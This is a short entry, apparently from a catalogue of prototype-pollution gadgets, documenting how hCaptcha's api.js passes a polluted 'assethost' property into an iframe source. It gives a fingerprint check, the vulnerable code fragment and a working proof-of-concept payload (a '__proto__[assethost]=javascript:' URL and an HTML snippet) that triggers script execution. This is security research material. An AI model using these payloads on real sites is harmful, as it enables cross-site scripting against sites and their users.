## hCaptcha

### URL

https://docs.hcaptcha.com/

### JS Fingerprint

```js
typeof hcaptcha !== 'undefined'
```

### Vulnerable code fragment

https://hcaptcha.com/1/api.js

```js
ae.assethost && (n = ae.assethost + re.assetUrl.replace(re.assetDomain, "")),
this.$iframe.dom.src = n + "/hcaptcha-challenge.html#id=" + this.id + "&host=" + this._host + (t ? "&" + Rt(this.config) : ""),
```

### PoC

```
?__proto__[assethost]=javascript:alert(1)//
```

```html
<script src="https://hcaptcha.com/1/api.js" async defer></script>
<script>
  Object.prototype.assethost="javascript:alert(1)//"
</script>
<div class="h-captcha" data-sitekey="your-site-key"></div>
```
